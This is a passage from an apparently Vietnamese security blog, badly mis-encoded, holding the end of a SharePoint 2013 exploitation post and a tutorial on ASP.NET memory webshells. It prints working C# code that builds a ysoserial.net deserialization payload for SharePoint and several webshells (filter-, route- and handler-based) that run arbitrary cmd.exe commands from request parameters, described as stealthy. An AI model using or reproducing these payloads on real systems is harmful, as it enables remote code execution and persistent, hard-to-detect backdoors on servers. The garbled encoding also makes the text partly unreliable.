E.cs Ä‘á»ƒ load nhÆ°ng mÃ¬nh test thÃ¬ tháº¥y khÃ¡ nháº¥p nhÃ¡y nÃªn mÃ¬nh Ä‘Ã£ chá»n compile file nÃ y thÃ nh dll rá»“i load (works everytime).\nVÃ¬ chain nÃ y náº¿u nhÆ° vá»›i ver dotNet \u0026gt; 4.7 thÃ¬ cáº§n pháº£i disable type check, nÃªn mÃ¬nh Ä‘i check ver dotnet cá»§a Sharepoint:\n1 2 3 4 5 6 PS C:\\Users\\sp_farmadmin\u0026gt; Set-Location \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Client\u0026#39; PS HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Client\u0026gt; Get-ItemProperty -Path . | Select-Object Version Version ------- 4.5.51641 Ngon luÃ´n, thá»­ test deser load C# code trÆ°á»›c nÃ o.\nFile E.cs mÃ¬nh sá»­a tÃ­ tá»« file máº·c Ä‘á»‹nh thÃ´i:\n1 2 3 4 5 6 7 class E { public E(){ HttpContext.Current.Response.AddHeader(\u0026#34;kev1n-header-custom\u0026#34;, \u0026#34;muhehehehe\u0026#34;); HttpContext.Current.Response.Cookies.Add(new HttpCookie(\u0026#34;skibidi\u0026#34;, \u0026#34;dopdopyesyes\u0026#34;)); HttpContext.Current.Response.End(); } } Sá»­a láº¡i script exploit pháº§n call nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 static void Main(string[] args) { var spformatter = Activator.CreateInstance(\u0026#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\u0026#34;, \u0026#34;Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter\u0026#34;).Unwrap(); MethodInfo SPSerializer = spformatter.GetType().GetMethod(\u0026#34;Serialize\u0026#34;, new Type[] { typeof(object) }); Process.Start(@\u0026#34;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\u0026#34;, @\u0026#34;/target:library /out:ysoserial-net\\E.dll ysoserial-net\\E.cs\u0026#34;)?.WaitForExit(); var psi = new ProcessStartInfo(@\u0026#34;ysoserial.exe\u0026#34;, @\u0026#34;-f BinaryFormatter -g ActivitySurrogateSelector -c \u0026#34;\u0026#34;1337\u0026#34;\u0026#34;\u0026#34;) { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }; var p = Process.Start(psi); string payload = p.StandardOutput.ReadToEnd().Trim(); p.WaitForExit(); //Console.WriteLine(payload); byte[] bytes = Convert.FromBase64String(payload); DataSetMarshalMod marshal = new DataSetMarshalMod(bytes); ArrayList myAl = new ArrayList(); myAl.Add(marshal); object[] parametersArray = new object[] { myAl }; string result = (string)SPSerializer.Invoke(spformatter, parametersArray); File.WriteAllText(\u0026#34;objstate.txt\u0026#34;, result); Console.WriteLine(result); } Gen thÃ nh payload vÃ  send request, response cÃ³ chá»©a cookie vÃ  header mÃ¬nh set: Sá»­a code file E.cs thÃ nh code deploy memshell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 class E { public class MyRouteBase : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { String cmd = httpContext.Request.QueryString[\u0026#34;command\u0026#34;]; if (cmd != null) { HttpResponseBase response = httpContext.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } public E(){ RouteCollection routeCollection = RouteTable.Routes; routeCollection.Insert(0, new MyRouteBase()); HttpContext.Current.Response.AddHeader(\u0026#34;Custom-Header\u0026#34;, \u0026#34;Route Memshell Injected!!!!!!!!\u0026#34;); HttpContext.Current.Response.End(); } } Xuáº¥t hiá»‡n header Custom-Header trong response, chá»©ng tá» C# code Ä‘Ã£ Ä‘Æ°á»£c load: RCE thÃ´i: ","date":"2026-01-20T00:00:00Z","permalink":"https://kev1n1203.github.io/p/sharepoint-2013/","title":"ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized"},{"content":"DÆ°á»›i sá»± hÆ°á»›ng dáº«n sÃ¡t sao cá»§a ngÆ°á»i anh - ngÆ°á»i tháº§y Jang, mÃ¬nh Ä‘Ã£ báº£o vá»‡ thÃ nh cÃ´ng Ä‘á»“ Ã¡n tá»‘t nghiá»‡p Ä‘á» tÃ i Memory Webshell trong .NET vá»›i káº¿t quáº£ khÃ¡ tá»‘t. PhÃ¨ phÆ°á»¡n 1 thÃ¡ng khÃ´ng viáº¿t lÃ¡ch, mÃ¬nh nghÄ© mÃ¬nh nÃªn viáº¿t láº¡i gÃ¬ Ä‘Ã³ thay vÃ¬ chá»‰ lÆ°u trá»¯ kiáº¿n thá»©c trong quyá»ƒn Ä‘á»“ Ã¡n ná»™p cho nhÃ  trÆ°á»ng, vá»«a Ä‘á»ƒ cá»§ng cá»‘ kiáº¿n thá»©c, vá»«a Ä‘á»ƒ tiá»‡n search láº¡i sau nÃ y.\nÄÃ¢y sáº½ lÃ  bÃ i viáº¿t trÃ¬nh bÃ y nhá»¯ng hiá»ƒu biáº¿t cá»§a mÃ¬nh trong quÃ¡ trÃ¬nh há»c há»i vÃ  nghiÃªn cá»©u ká»¹ thuáº­t Memshell trong ASP.NET, áº£nh hÆ°á»Ÿng náº·ng ná» tá»« yzddmr6 vÃ  endy.\nHTTP Life Cycle Trong mÃ´i trÆ°á»ng .NET Framework, webapp sáº½ Ä‘Æ°á»£c deploy dÆ°á»›i web server lÃ  IIS (Internet Information Services) vÃ  thÆ°á»ng code theo 2 dáº¡ng: WebForms vÃ  WebMVC. Táº¥t cáº£ cÃ¡c request dÃ¹ Ä‘Æ°á»£c code theo kiá»ƒu nÃ o Ä‘á»u sáº½ Ä‘i qua má»™t chuá»—i cÃ¡c sá»± kiá»‡n chuyÃªn biá»‡t Ä‘á»ƒ xá»­ lÃ½ yÃªu cáº§u Ä‘áº¿n trong ASP.NET, gá»i lÃ  HTTP Pipeline. MÃ´ hÃ¬nh cá»§a HTTP pipeline cÃ³ thá»ƒ Ä‘Æ°á»£c mÃ´ táº£ nhÆ° sau: QuÃ¡ trÃ¬nh nÃ y Ä‘i qua má»™t sá»‘ bÆ°á»›c:\nNháº­n HTTP request tá»« ngÆ°á»i dÃ¹ng, IIS sá»­ dá»¥ng native dll Aspnet_isapi.dll Ä‘á»ƒ báº¯t Ä‘áº§u quÃ¡ trÃ¬nh xá»­ lÃ½, Ä‘Æ°a request vÃ o má»™t instance cá»§a class HttpRuntime. HttpRuntime class gá»i Ä‘áº¿n HttpApllicationFactory yÃªu cáº§u cáº¥p instance HttpApplication Ä‘á»ƒ xá»­ lÃ½ request, khá»Ÿi táº¡o pipeline, má»—i instance chá»©a cÃ¡c HttpModule - nÆ¡i kiá»ƒm tra vÃ  thay Ä‘á»•i ná»™i dung cá»§a HTTP request thÃ´ng qua sá»± kiá»‡n cÃ³ thá»© tá»± nháº¥t Ä‘á»‹nh. Request Ä‘Æ°á»£c duyá»‡t qua nhiá»u sá»± kiá»‡n, gá»i Ä‘Ã¢y lÃ  HTTP Pipeline Khi gá»i Ä‘áº¿n sá»± kiá»‡n PreRequestHandlerExecute, IIS sáº½ chá»n ra HttpHandler tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½ thá»±c táº¿ vÃ  render pháº£n há»“i vá» cho client. VÃ­ dá»¥ nhÆ° MvcHandler trong Web MVC vÃ  PageRouteHandler trong Web Forms. HTTP Pipeline sá»­ dá»¥ng object HttpContext Ä‘á»ƒ biá»ƒu thá»‹ cho HTTP request hiá»‡n táº¡i, object nÃ y Ä‘Æ°á»£c truyá»n vÃ o khi khá»Ÿi táº¡o HttpApplication, Ä‘i qua quÃ¡ trÃ¬nh xá»­ lÃ½ cá»§a HttpModule cÅ©ng nhÆ° Ä‘Æ°á»£c Ä‘Æ°a xuá»‘ng HttpHandler táº¡i method ProcessRequest. Viá»‡c deploy memshell sáº½ sá»­ dá»¥ng cÃ¡c component cÃ³ kháº£ nÄƒng xá»­ lÃ½ vÃ  kiá»ƒm soÃ¡t HTTP Request/Response trong pipeline, nÃªn Ä‘Ã¢y lÃ  nhá»¯ng kiáº¿n thá»©c ná»n táº£ng cáº§n pháº£i biáº¿t trÆ°á»›c khi tÃ¬m hiá»ƒu Ä‘áº¿n memshell.\nFilter Memory Webshell Sau khi chá»n Ä‘Æ°á»£c MVCHandler Ä‘á»ƒ xá»­ lÃ½ request, mÃ´ hÃ¬nh ASP.NET MVC sáº½ Ä‘i qua class Controller - cÃ³ nhiá»‡m vá»¥ chá»n ra ActionMethod Ä‘Ãºng Ä‘á»ƒ thá»±c thi request vÃ  tráº£ káº¿t quáº£ vá» cho client. NhÆ°ng trÆ°á»›c Ä‘Ã³ thÃ¬ MVC cung cáº¥p cho ngÆ°á»i dÃ¹ng cÆ¡ cháº¿ Filter â€“ cÃ³ chá»©c nÄƒng \u0026ldquo;filter\u0026rdquo; cÃ¡c request tÆ°Æ¡ng tá»± nhÆ° class Filter cá»§a Java Tomcat, cÃ³ kháº£ nÄƒng thÃªm code xá»­ lÃ½ logic, log lá»—i, kiá»ƒm tra xÃ¡c thá»±c trÆ°á»›c khi request Ä‘áº¿n bÆ°á»›c Action Method. TÃ­nh nÄƒng nÃ y náº±m trong MVC Middleware chá»‰ thuá»™c ASP.NET MVC, nÃªn Ä‘á»ƒ triá»ƒn khai Ä‘Æ°á»£c thÃ¬ webapps cáº§n Ä‘Æ°á»£c code theo kiá»ƒu MVC\nFilter in .NET Khi táº¡o 1 project web MVC sáº½ xuáº¥t hiá»‡n 3 thÆ° má»¥c Models â€“ Views â€“ Controllers, ngoÃ i ra tá»“n táº¡i má»™t sá»‘ thÆ° má»¥c máº·c Ä‘á»‹nh khÃ¡c vá»›i cÃ¡c chá»©c nÄƒng chá»§ yáº¿u Ä‘á»ƒ lÆ°u trá»¯ nhÆ° App_Data, Content, Scripts,\u0026hellip; Äáº·c biá»‡t chÃº Ã½ Ä‘áº¿n file Global.asax, file nÃ y sáº½ Ä‘Æ°á»£c gá»i 1 láº§n khi á»©ng dá»¥ng web báº¯t Ä‘áº§u khá»Ÿi cháº¡y, chá»©a cÃ¡c thÃ nh pháº§n cÆ¡ báº£n cáº§n pháº£i Ä‘Æ°á»£c khai bÃ¡o Ä‘á»ƒ start up web service, Ä‘Ã³ lÃ  cÃ¡c filters, routes vÃ  bundles: Táº¡i file FilterConfig.cs náº±m trong App_Start chá»©a cÃ¢u lá»‡nh thÃªm filter tá»± Ä‘á»‹nh nghÄ©a vÃ o GlobalFilterCollection, máº·c Ä‘á»‹nh cÃ³ filter HandleErrorAttribute Ä‘á»ƒ xá»­ lÃ½ lá»—i CÃ¡c filter thá»±c cháº¥t sáº½ Ä‘Æ°á»£c thÃªm táº¡i class GlobalFilterCollection thuá»™c namespace System.Web.Mvc: Vá» cÆ¡ báº£n, quÃ¡ trÃ¬nh Add sáº½ diá»…n ra nhÆ° sau:\nTáº¡o má»™t List\u0026lt;Filter\u0026gt; Ä‘á»ƒ lÆ°u trá»¯ Filter dÆ°á»›i dáº¡ng list, lÆ°u táº¡i thuá»™c tÃ­nh _filters Kiá»ƒm tra Filter Ä‘Æ°á»£c thÃªm vÃ o táº¡i method ValidateFilterInstance, náº¿u khÃ´ng thá»a mÃ£n sáº½ tráº£ vá» lá»—i ThÃªm Filter vÃ o List khai bÃ¡o trÆ°á»›c Ä‘Ã³, náº¿u Filter khÃ´ng Ä‘i kÃ¨m giÃ¡ trá»‹ order sáº½ táº¡o order vá»›i kiá»ƒu dá»¯ liá»‡u integer vÃ  giÃ¡ trá»‹ máº·c Ä‘á»‹nh lÃ  null Method ValidateFilterInstance Ä‘Æ°á»£c gá»i Ä‘á»ƒ xem filter cÃ³ implement cÃ¡c interface cá»§a má»™t filter há»£p lá»‡ hay khÃ´ng: CÃ¡c filter há»£p lá»‡ gá»“m cÃ³:\nAuthorization filters: phá»¥c vá»¥ xÃ¡c thá»±c vÃ  á»§y quyá»n trÆ°á»›c khi bÆ°á»›c vÃ o cÃ¡c action cá»§a controller Action filters: chá»©a logic mÃ  Ä‘Æ°á»£c thá»±c thi trÆ°á»›c vÃ  sau khi thá»±c thi Controller Result filters: thá»±c thi trÆ°á»›c vÃ  sau khi render View Exception filters: log, handle vÃ  catch cÃ¡c exception xáº£y ra trong quÃ¡ trÃ¬nh Controller hoáº·c View cháº¡y Trong sá»‘ cÃ¡c filter nÃ y thÃ¬ Authorization filters Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn. MÃ¬nh sáº½ Æ°u tiÃªn chá»n nhá»¯ng filter sá»›m nháº¥t Ä‘á»ƒ inject\nFilter Comparison Khi tá»“n táº¡i 2 filters implements cÃ¹ng má»™t interface, thá»© tá»± thá»±c thi sáº½ Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh thÃ´ng qua 2 tham sá»‘: Order vÃ  Scope Náº¿u chÆ°a khai bÃ¡o thÃ¬ máº·c Ä‘á»‹nh Order sáº½ Ä‘Æ°á»£c gÃ¡n lÃ  -1. CÃ²n giÃ¡ trá»‹ scope Ä‘Æ°á»£c biá»ƒu diá»…n nhÆ° sau: Logic so sÃ¡nh náº±m táº¡i class FilterComparer thuá»™c FilterProviderCollection:\nGiÃ¡ trá»‹ Order cÃ ng nhá» thÃ¬ cÃ ng Ä‘Æ°á»£c Æ°u tiÃªn thá»±c thi Khi giÃ¡ trá»‹ Order báº±ng nhau sáº½ xem xÃ©t Ä‘áº¿n giÃ¡ trá»‹ Scope. TÆ°Æ¡ng tá»± nhÆ° Order, giÃ¡ trá»‹ Scope cÃ ng nhá» thÃ¬ má»©c Ä‘á»™ Æ°u tiÃªn cÃ ng cao. =\u0026gt; Chá»‰ cáº§n set giÃ¡ trá»‹ cho Filter.Order má»™t sá»‘ nguyÃªn nhá» hÆ¡n -1 lÃ  Ä‘Æ°á»£c.\nDeploy VÃ¬ class GlobalFilterCollection lÃ  public class nÃªn mÃ¬nh cÃ³ thá»ƒ gá»i Ä‘áº¿n mÃ  khÃ´ng cáº§n reflection, logic code sáº½ nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class MalFilter : IAuthorizationFilter { public void OnAuthorization(AuthorizationContext filterContext){ String cmd = filterContext.HttpContext.Request.QueryString[\u0026#34;command\u0026#34;]; if (cmd != null){ HttpResponseBase response = filterContext.HttpContext.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); response.End(); } } } ... GlobalFilters.Filters.Add(new MalFilter(), -10); Sau Ä‘Ã³ thÃ¬ mÃ¬nh cÃ³ thá»ƒ exec command vá»›i cÃ¡c Ä‘Æ°á»ng dáº«n há»£p lá»‡: MÃ¬nh nÃ³i lÃ  Ä‘Æ°á»ng dáº«n há»£p lá»‡ bá»Ÿi vÃ¬ filter nÃ y khÃ´ng Ä‘Æ°á»£c call náº¿u path khÃ´ng tá»“n táº¡i, Ä‘Ã¢y cÅ©ng lÃ  1 lÆ°u Ã½ khi sá»­ dá»¥ng loáº¡i memshell nÃ y: Route Memory Webshell Tiáº¿p Ä‘áº¿n lÃ  ká»¹ thuáº­t Route, lá»£i dá»¥ng cÆ¡ cháº¿ routing Ä‘á»ƒ xá»­ lÃ½, cÆ¡ cháº¿ nÃ y lÃ  má»™t module hoáº¡t Ä‘á»™ng trong pipeline, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ phá»¥c vá»¥ xá»­ lÃ½ URL khi cÃ³ request Ä‘áº¿n. Cá»¥ thá»ƒ hÆ¡n, khi application event PostResolveRequestCache Ä‘Æ°á»£c gá»i trong request pipeline, ASP.NET Routing sáº½ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cá»§a request Ä‘á»ƒ chuyá»ƒn cho HttpHandler phÃ¹ há»£p, rá»“i gá»­i lÃªn framework layer cao hÆ¡n tiáº¿p tá»¥c thá»±c thi: Logic Add Route File RouteConfig.cs máº·c Ä‘á»‹nh sá»­ dá»¥ng method MapRoute Ä‘á»ƒ Ä‘á»‹nh nghÄ©a Route cÃ³ trong á»©ng dá»¥ng web vá»›i tÃªn lÃ  Default: ÄÃ¢y lÃ  cÃ¡ch mÃ  WebMVC sá»­ dá»¥ng Ä‘á»ƒ thÃªm vÃ  Ä‘á»‹nh nghÄ©a route má»›i, Ä‘i sÃ¢u vÃ o hÃ m MapRoute mÃ¬nh tháº¥y thá»±c cháº¥t nÃ³ Ä‘ang khá»Ÿi táº¡o thÃ´ng tin Route tá»« dá»¯ liá»‡u truyá»n vÃ o, cÃ²n hÃ m thá»±c sá»± thÃªm Route vÃ o RouteCollection náº±m táº¡i method Add thuá»™c namespace System.Web.Routing: Method Add cáº§n 2 tham sá»‘. Tham sá»‘ name khÃ´ng quan trá»ng khi Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xem Ä‘Ã£ cÃ³ route nÃ o cÃ³ giÃ¡ trá»‹ name nÃ y chÆ°a. CÃ²n tham sá»‘ route Ä‘Æ°á»£c Ã©p kiá»ƒu vá» RouteBase lÃ  quan trá»ng nháº¥t. RouteBase lÃ  má»™t abstract class, Ä‘Æ°á»£c class System.Web.Routing.Route implement máº·c Ä‘á»‹nh.\nNhÆ° váº­y sáº½ cÃ³ Ã­t nháº¥t 2 cÃ¡ch Ä‘á»ƒ triá»ƒn khai Route Memory Webshell, má»™t lÃ  tá»± táº¡o class Ä‘á»ƒ implement RouteBase, hai lÃ  sá»­ dá»¥ng System.Web.Routing.Route Ä‘Ã£ implement RouteBase sáºµn.\nTá»± Implement RouteBase: VÃ¬ lÃ  1 abstract class nÃªn mÃ¬nh cáº§n override 2 method GetRouteData vÃ  GetVirtualPath cÃ³ trong nÃ³: Hai method nháº­n vÃ o cÃ¡c tham sá»‘ khÃ¡c nhau nhÆ°ng Ä‘á»u cÃ³ object context cá»§a current request nÃªn Ä‘á»u cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c. CÃ´ng dá»¥ng cá»§a chÃºng gáº§n nhÆ° ngÆ°á»£c nhau:\nGetRouteData: Tráº£ vá» cÃ¡c thÃ´ng tin routing cá»§a request khi request match vá»›i route GetVirtualPath: Láº¥y thÃ´ng tin vá» route cá»§a request khi request match vá»›i value truyá»n vÃ o MÃ¬nh cÃ³ script ngáº¯n nÃ y Ä‘á»ƒ check xem method nÃ o Ä‘Æ°á»£c thá»±c hiá»‡n trÆ°á»›c:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script runat=\u0026#34;server\u0026#34;\u0026gt; public class MyRouteBase : RouteBase{ public override RouteData GetRouteData(HttpContextBase httpContext){ Console.WriteLine(\u0026#34;GetRouteData is called!!\u0026#34;); return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){ Console.WriteLine(\u0026#34;GetVirtualPath is called!!\u0026#34;); return null; }} \u0026lt;/script\u0026gt; Káº¿t quáº£ thÃ¬ GetRouteData Ä‘Æ°á»£c gá»i trÆ°á»›c, mÃ¬nh sáº½ dÃ¹ng method nÃ y: Khi debug vÃ o chÆ°Æ¡ng trÃ¬nh thÃ¬ vá»›i má»—i request, vá»›i má»—i RouteBase thÃ¬ cÃ¡c method GetRouteData vÃ  GetVirtualPath Ä‘á»u Ä‘Æ°á»£c gá»i láº§n lÆ°á»£t thÃ´ng qua cÃ¢u lá»‡nh foreach: Äá»ƒ route cá»§a báº£n thÃ¢n chÃ¨n vÃ o Ä‘Æ°á»£c cháº¡y Ä‘áº§u tiÃªn trong vÃ²ng for thÃ¬ Ä‘Æ¡n giáº£n mÃ¬nh Insert vÃ o vá»‹ trÃ­ Ä‘áº§u tiÃªn lÃ  Ä‘Æ°á»£c:\n1 2 RouteCollection routes = RouteTable.Routes; routes.Insert(0, new MyRouteBase()); MÃ¬nh sáº½ cÃ³ code deploy route memshell nhÆ° nÃ y:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class CustomRouteBase : RouteBase{ public override RouteData GetRouteData(HttpContextBase httpContext){ String cmd = httpContext.Request.QueryString[\u0026#34;command\u0026#34;]; if (cmd != null){ HttpResponseBase response = httpContext.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); response.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){ return null; } } ... RouteCollection routeCollection = RouteTable.Routes; routeCollection.Insert(0, new CustomRouteBase()); We got memshell in arbitrary route bois: Sá»­ dá»¥ng System.Web.Routing.Route Náº¿u nhÆ° khÃ´ng muá»‘n tá»± táº¡o class implement RouteBRase thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng public class System.Web.Routing.Route: Má»™t Route há»£p lá»‡ thÃ¬ cáº§n truyá»n vÃ o hai tham sá»‘:\nUrl dÃ¹ng Ä‘á»ƒ chá»©a giÃ¡ trá»‹ Ä‘Æ°á»ng dáº«n cho route RouteHandler Ä‘á»ƒ truyá»n vÃ o handler cho route Ä‘Ã³, vá»›i kiá»ƒu IRouteHandler Nháº£y vÃ o IRouteHandler interface, Ä‘á»ƒ implement Ä‘Æ°á»£c interface nÃ y, cáº§n pháº£i override method GetHttpHandler Ä‘á»ƒ xá»­ lÃ½ HTTP Response tráº£ vá» cho ngÆ°á»i dÃ¹ng. Vá»«a hay khi method GetHttpHandler nháº­n Ä‘áº§u vÃ o lÃ  RequestContext â€“ má»™t encapsulation object cá»§a current HTTP request, nÃªn mÃ¬nh cÃ³ thá»ƒ xÃ i nÃ³ Ä‘á»ƒ control request vÃ o vÃ  response ra: Sá»­ dá»¥ng logic bÃªn trÃªn, mÃ¬nh cook thÃ nh Ä‘oáº¡n code nhÆ° nÃ y:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class CustomRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext){ String cmd = requestContext.HttpContext.Request.Form[\u0026#34;command\u0026#34;]; if (cmd != null){ HttpResponseBase response = requestContext.HttpContext.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); } return null; } } ... RouteCollection routeCollection = RouteTable.Routes; Route customRoute = new Route(\u0026#34;RouteMemshell\u0026#34;, new CustomRoute()); routeCollection.Insert(0, customRoute); NhÆ°ng mÃ  khi gá»i Ä‘áº¿n /RouteMemshell thÃ¬ mÃ¬nh bá»‹ lá»—i 500, lá»—i nÃ y do CustomRoute táº¡o ra khÃ´ng tráº£ vá» object cÃ³ dáº¡ng IHttpHandler: Cáº§n sá»­a láº¡i code xÃ­u Ä‘á»ƒ lÆ°á»£m Ä‘Æ°á»£c output táº¡i response. Cá»¥ thá»ƒ lÃ  method GetHttpHandler cáº§n return object implement interface IHttpHandler thay vÃ¬ chá»‰ exec command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class CustomRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext){ return new CustomHandler(requestContext); } } public class CustomHandler : IHttpHandler{ public RequestContext RequestContext { get; private set; } public CustomHandler(RequestContext context){ this.RequestContext = context; } public void ProcessRequest(HttpContext context){ String cmd = context.Request.Form[\u0026#34;command\u0026#34;]; if (cmd != null){ HttpResponse response = context.Response; Process p = new Process(); p.StartInfo.FileName = \u0026#34;cmd.exe\u0026#34;; p.StartInfo.Arguments = \u0026#34;/c\u0026#34; + cmd; p.Start(); byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()); response.Write(System.Text.Encoding.Default.GetString(data)); } } public bool IsReusable { get; } } NhÆ° nÃ y thÃ¬ cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c response rá»“i: Máº·c dÃ¹ khÃ´ng thá»ƒ khai bÃ¡o cho cÃ³ thá»ƒ truy cáº­p route memory webshell báº±ng Ä‘Æ°á»ng dáº«n tÃ¹y Ã½ nhÆ°ng cÃ³ thá»ƒ sá»­ dá»¥ng dáº¥u {} Ä‘á»ƒ biá»ƒu diá»…n kÃ½ tá»± ngáº«u nhiÃªn. MÃ¬nh vÃ­ dá»¥ nhÆ° nÃ y:\n1 Route customRoute = new Route(\u0026#34;route{xxx}\u0026#34;, new CustomRoute()); ThÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng route memory webshell vá»›i Ä‘Æ°á»ng dáº«n \u0026ldquo;route\u0026rdquo; káº¿t há»£p vá»›i cÃ¡c kÃ½ tá»± báº¥t ká»³: HTTPListener Memory Webshell HttpListener lÃ  1 class thuá»™c .NET Base Class Library, cung cáº¥p kháº£ nÄƒng khá»Ÿi táº¡o má»™t HTTP server Ä‘Æ¡n giáº£n vÃ  cÃ³ kháº£ nÄƒng tÃ¹y biáº¿n cao (nghe khÃ¡ giá»‘ng vá»›i python3 -m http.server) ğŸ‘Œ\nKhÃ´ng phá»¥ thuá»™c hay cháº¡y qua IIS cÅ©ng nhÆ° khÃ´ng náº±m trong cÃ¡c thÃ nh pháº§n cá»§a má»™t project ASP.NET, HttpListener chá»‰ cáº§n truyá»n vÃ o Ä‘á»‹a chá»‰ láº¯ng nghe, port vÃ  Ä‘Æ°á»ng dáº«n Ä‘á»ƒ khá»Ÿi táº¡o má»™t web service. Do Ä‘áº·c tÃ­nh hoáº¡t Ä‘á»™ng lÃ  1 service Ä‘á»™c láº­p nÃªn cháº¯c cháº¯n nÃ³ sáº½ khÃ´ng lÆ°u láº¡i log trÃªn server, Ä‘á»“ng thá»i cÃ³ thá»ƒ run cÃ¹ng port, cÃ¹ng host vá»›i service web khiáº¿n nÃ³ khÃ¡ khÃ³ phÃ¡t hiá»‡n náº¿u nhÆ° Ä‘Æ°á»£c deploy.\nTuy nhiÃªn, trong cÃ¡c blog mÃ¬nh tham kháº£o thÃ¬ há» cÃ³ nÃ³i ráº±ng ká»¹ thuáº­t nÃ y chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c triá»ƒn khai vá»›i quyá»n System. Äiá»u nÃ y khÃ¡ khÃ³ xáº£y ra do thÃ´ng thÆ°á»ng user deploy webapps sáº½ lÃ  user IIS (default iis apppool\\{pool name}). Ngoáº¡i trá»« má»™t sá»‘ trÆ°á»ng há»£p nhÆ° Ä‘á»‘i vá»›i Microsoft Exchange sáº½ máº·c Ä‘á»‹nh cháº¡y quyá»n System nÃªn ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ lÃ m post-exploit memshell sau khi khai thÃ¡c lá»—i deser CVE-2020-17144\nPhÃ¢n tÃ­ch Vá» cÆ¡ báº£n thÃ¬ ká»¹ thuáº­t nÃ y sáº½ khá»Ÿi táº¡o má»™t service web riÃªng biá»‡t nÃªn sáº½ khÃ´ng cháº¡y chÃ¨n vÃ o má»™t class nÃ o cá»§a service web hiá»‡n táº¡i. CÃ´ng viá»‡c cÃ²n láº¡i lÃ  xá»­ lÃ½ HTTP Request Ä‘á»ƒ nháº­n Ä‘Æ°á»£c Ä‘áº§u vÃ o, xá»­ lÃ½ logic vÃ  tráº£ káº¿t quáº£ vá» táº¡i response.\nTáº¡i namespace System.Net Ä‘Ã£ tá»“n táº¡i System.Net.HttpListenerContext Ä‘Ã³ng vai trÃ² nháº­n, xá»­ lÃ½ vÃ  tráº£ vá» káº¿t quáº£ cho má»™t HTTP Request nhÆ° lÃ  HttpContext thuá»™c namespace System.Web. NhÆ°ng class HttpListenerRequest khÃ¡ thÃ´ sÆ¡ vÃ  khÃ´ng cÃ³ cÃ¡c phÆ°Æ¡ng thá»©c xá»­ lÃ½ input nhÆ° lÃ  System.Web.Request, nÃªn viá»‡c nháº­n vÃ  xá»­ lÃ½ dá»¯ liá»‡u lÃ  Ä‘iá»u khÃ¡ khÃ³ khÄƒn.\nGiáº£i phÃ¡p Ä‘Æ°a ra lÃ  láº¥y háº¿t dá»¯ liá»‡u trong object HttpListenerRequest vÃ  HttpListenerResponse, tá»« Ä‘Ã³ tá»± craft thÃ nh System.Web.HttpRequest Ä‘á»ƒ nháº­n/xá»­ lÃ½ dá»¯ liá»‡u.\nCá»© tÆ°á»Ÿng lÃ  ngon Äƒn, nhÆ°ng quÃ¡ trÃ¬nh parse HTTP Request gáº·p váº¥n Ä‘á» khi HttpRequest khÃ´ng nháº­n Ä‘Æ°á»£c tham sá»‘ táº¡i POST body request, máº·c dÃ¹ váº«n 